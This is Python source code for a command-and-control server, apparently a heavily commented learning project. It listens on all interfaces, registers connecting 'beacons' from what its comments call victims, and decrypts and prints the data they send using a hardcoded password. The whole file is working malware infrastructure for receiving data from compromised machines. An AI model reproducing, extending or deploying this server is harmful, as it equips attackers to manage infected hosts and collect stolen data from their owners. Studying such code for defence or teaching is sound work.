import socket 
import threading 
import json
import time
from encrypt import EncryptedCommunicator

class C2Server:
    #This init is in charge of setting up the network configuarations
    # host='0.0.0.0' means to listen on any and all network interfaces 
    # port=8080 is just the specific network port to listen on
    # active_session is the dict to track all connected victums
    # session counter just gives each beacon an ID    
    def __init__(self, host='0.0.0.0', port=8080, password='Mr.Robot'): 
        self.host = host 
        self. port = port
        self.password = password
        self.active_sessions = {}
        self.session_counter = 0

        self.encryptor = EncryptedCommunicator(password) # This is pretty much creating the encryption engine that we will use to encrypt data in the this server code

        self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #creates a new socket, IPV4, TCP
        self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1) #sets the options, the option that is being set is SO_REUSEADDR 
                                                                              #so that we can reconnect to the same local address after the server stops.

    def start_server(self):
        try:
            self.server_sock.bind((self.host, self.port)) #this is claiming the IP address and port of our server which we set up earlier
            self.server_sock.listen(5) #this allows for up to 5 beacons to wait in line while the server is busy
            print(f"C2 Server is listenting on {self.host}:{self.port}")
            print(f"waiting for beacon the beacon to connect......")

            while True: #this is acting as a beacon connection acceptor
                client_socket, client_address = self.server_sock.accept() #when a connection is accepted, this is getting a new socket object (client_socket) and IP/port (client_address) that is dedicated to that newley connected beacon
                                                                            #the accept is waiting indefinitely for a new connection  
                print(f"New beacon connection from {client_address}") 

                client_thread = threading.Thread( #creates a parallel thread, like opening a new tab in browser
                    target=self.handle_beacon, #this is running the handle_beacon function inside of the new thread 
                    args=(client_socket, client_address) #giving handle_beacon the beacons address and socket
                )
                client_thread.daemon = True #daemon thread, it will die if the main thread (server) exits
                client_thread.start() #begins running this new thread

        except Exception as e: #saftey net for any error in the try block, exeption types are stored in e, I just don't want python tracebacks
            print(f"Server error: {e}")
        finally: #cleanup, so that the port or socket aren't locked out
            self.server_sock.close()

    def handle_beacon(self, client_socket, client_address): # given the client_socket and client_address which was gotten from the .accept tuple in start_server()
        session_id = self.session_counter # takes the current value of the counter (starts 0) and assigns it to session_id
        self.session_counter += 1 # inc counter so next beacon connection gets a new ID

        self.active_sessions[session_id] = {      #storing initial beacon info
            'socket': client_socket,
            'address': client_address,
            'connected_at': time.time()  #timestamp of when the beacon connected
        }

        print(f"Beacon: {session_id} , Registered from: {client_address}")

        try:

            while True:
                encrypted_data = client_socket.recv(4096)  #thread will pause and wait here until the beacon sends data, stores the raw bytes into encrypted_data (max 4096 bytes) 

                if not encrypted_data:  #if recv() gives an empty result, happens when the beacon closes the socket, sends a FIN
                    break  #exit loop
                    
                beacon_data = self.encryptor.DecryptMessage(encrypted_data) #this is taking the encryption engine we defined at the top and using the .decrypt_message to decrypt the data coming in from the beacon
                    
                print(f"[Beacon {session_id}] -> {beacon_data}")


        finally:
            client_socket.close()
            if session_id in self.active_sessions: 
                del self.active_sessions[session_id]  #removes beacon from tracking list 
            print(f" Beacon {session_id} disconnected")
                    
if __name__ == "__main__":
    server = C2Server()
    server.start_server()


